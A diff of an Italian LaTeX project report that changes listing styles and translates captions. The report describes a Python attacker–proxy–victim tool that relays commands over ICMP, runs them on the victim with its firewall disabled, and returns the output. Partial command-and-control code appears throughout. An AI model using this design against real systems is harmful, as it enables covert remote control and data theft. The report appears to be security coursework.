@@ -52,11 +52,7 @@ Le principali variabili utilizzate sono:
 \end{itemize}
 \vspace{2ex} 
 \begin{lstlisting}[
-    language=Python
-    ,basicstyle=\footnotesize
-    ,firstnumber=0
-    ,numbers=left
-    ,numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={ip_vittima, proxy_list, attack_function}, emphstyle=\color{red} 
     ,literate={"}{{\texttt{\char34}}}1{"}{{\texttt{"}}}1
@@ -75,11 +71,11 @@ Le principali variabili utilizzate sono:
         ,"attack_function":"ipv4_1"
     }
 \end{lstlisting}
-\captionof{lstlisting}{Configuration File} 
+\captionof{lstlisting}{File di configurazione} 
 \label{script:attacker:configFile} 
 \vspace{2ex}  
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={get_args_from_parser, load_config_file, attack_type, setIP_vittima, setIP_host}, emphstyle=\color{red} 
     ,emph={[2]attack_function, ip_vittima, ip_host, proxy_list},emphstyle={[2]\color{blue}} 
@@ -105,7 +101,7 @@ Le principali variabili utilizzate sono:
         received_data.update({proxy.compressed:[]}) 
     dati_separati={}
 \end{lstlisting}
-\captionof{lstlisting}{Attacker's variables}
+\captionof{lstlisting}{Variabili dell'attaccante}
 \label{script:attacker:variables}
 
 
@@ -119,7 +115,7 @@ La connessione con i proxy avviene in questo modo:
     \item Alla fine, se ci sono proxy disponibili, si aspetta che i thread terminino la ricezione dei dati. 
 \end{enumerate}  
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={get_connected_proxy, wait_proxy_update}, emphstyle=\color{red} 
     ,emph={[2]thread_list, dict_proxy_socket, thread},emphstyle={[2]\color{blue}} 
@@ -154,7 +150,7 @@ La funzione \textbf{get\_connected\_proxy} è strutturata in questo modo:
     lo si fà partire [Code:\ref{script:attacker:connectedProxy} line 27].
 \end{itemize}  
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={get_connected_proxy, sendall, callback_func}, emphstyle=\color{red} 
     ,emph={[2]dict_proxy_socket, thread_list, proxy, socket_proxy, data},emphstyle={[2]\color{blue}} 
@@ -195,7 +191,7 @@ def get_connected_proxy(proxy_list, ip_vittima, callback_func, attack_func):
         thread.start() 
     return thread_list, dict_proxy_socket
 \end{lstlisting}
-\captionof{lstlisting}{Attacker get connected proxy}
+\captionof{lstlisting}{Metodo per connettersi ai proxy}
 \label{script:attacker:connectedProxy}
 
 
@@ -227,7 +223,7 @@ Questa lista di stringhe verra poi unita in una singola stringa.
 Dopo di ciò si resettano le variabili per poi richiedere di inserire un altro commando.
 \vspace{2ex} 
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={create_event_update_foreach_proxy, setup_thread_foreach_address, wait_data_from_proxy}, emphstyle=\color{red} 
     ,emph={[2]event_thread_update, thread_proxy_response, thread_list, thread_lock},emphstyle={[2]\color{blue}} 
@@ -289,7 +285,7 @@ Dopo di ciò si resettano le variabili per poi richiedere di inserire un altro c
         socket_proxy.sendall(com.END_COMMUNICATION.encode()) 
         socket_proxy.close()
 \end{lstlisting}
-\captionof{lstlisting}{Send command to proxy}
+\captionof{lstlisting}{Invio del comando ai proxy}
 \label{script:attacker:sendCommand}
 
 
@@ -315,7 +311,7 @@ Le principali variabili utilizzate sono:
 \end{itemize}
 \vspace{2ex}  
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={get_args_from_parser, iface_src_from_IP, ip_address, get}, emphstyle=\color{red} 
     ,emph={[2]ip_attaccante, ip_host, ip_vittima, attack_function},emphstyle={[2]\color{blue}} 
@@ -334,7 +330,7 @@ Le principali variabili utilizzate sono:
     ip_vittima=None 
     attack_function={} 
 \end{lstlisting}
-\captionof{lstlisting}{Proxy's variables}
+\captionof{lstlisting}{Variabili del proxy}
 \label{script:proxy:variables}
 
 
@@ -343,7 +339,7 @@ Per stabilire una connessione con l'attaccante si stabilisce un socket in cui il
 Il proxy accetterrà la connessione solo se la richiesta proviene dall'attaccante. 
 \vspace{2ex} \newline 
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={socket, setup_server}, emphstyle=\color{red} 
     ,emph={[2]ip_attaccante, socket_attacker, attacker_addr, data_received},emphstyle={[2]\color{blue}} 
@@ -369,15 +365,15 @@ def setup_server(ip_attaccante):
                 exit(0) 
     return data_received, socket_attacker
 \end{lstlisting}
-\captionof{lstlisting}{Setup server}
+\captionof{lstlisting}{Setup del server}
 \label{script:proxy:setupServer} 
 \vspace{4ex}
 Una volta accettata la connesisone con l'attaccante si avrà una variabile contenente i dati ricevuti e il socket della connessione. 
 Dai dati si ricaverà l'idirizzo IP della vittima oltre al metodo di attacco. 
 Mentre il socket verrà usato per confermare, all'attaccante, la ricezione dei dati. 
-\vspace{2ex} \newline 
+\vspace{2ex} \newline  
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={setup_server, get_attack_function}, emphstyle=\color{red} 
     ,emph={[2]ip_vittima, attack_function, data_received, socket_attacker},emphstyle={[2]\color{blue}} 
@@ -397,8 +393,8 @@ Mentre il socket verrà usato per confermare, all'attaccante, la ricezione dei d
     data=com.CONFIRM_PROXY+ip_vittima.compressed+ip_host.compressed
     socket_attacker.sendall(data.encode()) 
     print("Socket con attaccante stabilito") 
-\end{lstlisting}
-\captionof{lstlisting}{Setup server}
+\end{lstlisting} 
+\captionof{lstlisting}{Ricezione dei dati dall'attaccante}
 \label{script:proxy:setupServer}
 
 
@@ -413,7 +409,7 @@ La connessione con la vittima avviene in questo modo:
 \end{enumerate}
 \vspace{2ex} 
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={wait_conn_from_victim, setup_thread, send_packet, confirm_conn_to_victim}, emphstyle=\color{red} 
     ,emph={[2]thread, icmp_id, thread_response, thread_dict, thread_lock},emphstyle={[2]\color{blue}} 
@@ -464,7 +460,7 @@ Dopodichè si aspetta un ulteriore comando e nel caso è quello per terminare la
 viene aggiornata la vittima della cosa e poi si chiude il canale di comunicazione con l'attaccante [Code:\ref{script:proxy:recExecCommand} line 30]. 
 \vspace{2ex} \newline 
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={wait_command_from_attacker, send_data, sendall, wait_data_from_vicitm}, emphstyle=\color{red} 
     ,emph={[2]data_socket, data_received, thread_data, command},emphstyle={[2]\color{blue}} 
@@ -514,7 +510,7 @@ Ciascuna di esse viene mandata all'ataccante tramite il socket e, una volta sped
 si invia un ulteriore stringa che indicherà all'attaccante che tutti i dati sono stati mandati. 
 \vspace{2ex} \newline 
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={sendall}, emphstyle=\color{red} 
     ,emph={[2]data, socket_attacker},emphstyle={[2]\color{blue}} 
@@ -532,7 +528,7 @@ si invia un ulteriore stringa che indicherà all'attaccante che tutti i dati son
     socket_attacker.sendall(com.LAST_PACKET.encode())
     print(f"Dati mandati all'attaccante")
 \end{lstlisting}
-\captionof{lstlisting}{Ricezione ed esecuzione del comando}
+\captionof{lstlisting}{Invio dei dati ricevuti dalla vittima}
 \label{script:proxy:recExecCommand}
 
 
@@ -560,7 +556,7 @@ Le principali variabili vengono definite in questo modo:
 %-----------------------------------------------------------------
 \vspace{2ex}  
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={find_local_IP}, emphstyle=\color{red}
     ,emph={[2]ip_host},emphstyle={[2]\color{blue}} 
@@ -582,7 +578,7 @@ Le principali variabili vengono definite in questo modo:
 %-----------------------------------------------------------------
 \vspace{2ex} 
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+   language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={args}, emphstyle=\color{red} 
     ,emph={[2]num_proxy},emphstyle={[2]\color{blue}} 
@@ -609,7 +605,7 @@ Le principali variabili vengono definite in questo modo:
             mymethods.print_parser_supported_arguments(parser)
             raise Exception(f"get_args_from_parser: {e}")
 \end{lstlisting}
-\captionof{lstlisting}{Args victim}
+\captionof{lstlisting}{Variabili della vittima}
 \label{script:vittima:args}
 
 \subsubsection*{Connessione con i Proxy}
@@ -629,7 +625,7 @@ Il metodo che si occupa di ottenere i proxy connessi alla vittima è strutturato
 %\vspace{2ex} \newline
 \vspace{2ex}  
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={wait_conn_from_proxy, ask_bool_choice}, emphstyle=\color{red} 
     ,emph={[2]connected_proxy, lock_connected_proxy, num_proxy}, emphstyle={[2]\color{blue}} 
@@ -651,7 +647,7 @@ if len(connected_proxy) < num_proxy:
     else: 
         print("Continuo con i proxy trovati...") 
 \end{lstlisting}
-\captionof{lstlisting}{Metodo per la connesisone dei proxy}
+\captionof{lstlisting}{Metodo per la connesisone con i proxy}
 \label{script:vittima:proxyConnect}
 Il metodo che monitora i pacchetti viene definito in questa maniera. 
 Il metodo che aspetta la connessione da parte dei proxy è definito così:
@@ -677,7 +673,7 @@ successivamente uno di loro invierà il comando da eseguire e poi verranno usati
 %---------------------------------
 \vspace{2ex}  
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+    language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,emph={ip_dst}, emphstyle=\color{red} 
     ,emph={[2]icmp, icmp6, dst}, emphstyle={[2]\color{blue}} 
@@ -694,7 +690,7 @@ successivamente uno di loro invierà il comando da eseguire e poi verranno usati
 %---------------------------------
 \vspace{2ex} 
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+   language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,keywords={}
     ,keywordstyle=\color{blue}
@@ -749,7 +745,7 @@ try:
 except Exception as e:
     print(f"wait_conn_from_proxy closing connection: {e}",file=sys.stderr)
 \end{lstlisting}
-\captionof{lstlisting}{Waiting the connections from proxies}
+\captionof{lstlisting}{Aspettandoi la connessione dei proxy}
 \label{script:vittima:waitConnFromProxy}
 
 \subsubsection*{Esecuzione del comando ed inoltro del risultato}
@@ -760,7 +756,7 @@ il risultato viene inviato ai proxy [Code:\ref{script:vittima:commandExec}].
 Terminata la comunicazione il firewall viene riabilitato
 \vspace{2ex} \newline 
 \begin{lstlisting}[
-    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
+   language=Python, basicstyle=\tiny, firstnumber=0, numbers=left, numberstyle=\tiny, xleftmargin=7mm
     %
     ,keywords={}
     ,keywordstyle=\color{black}
@@ -794,7 +790,7 @@ Terminata la comunicazione il firewall viene riabilitato
             print(f"wait_command_send_data: {e}")
     print("Fine del programma")
 \end{lstlisting}
-\captionof{lstlisting}{Command execution}
+\captionof{lstlisting}{Esecuzione del comando}
 \label{script:vittima:commandExec}
 
 
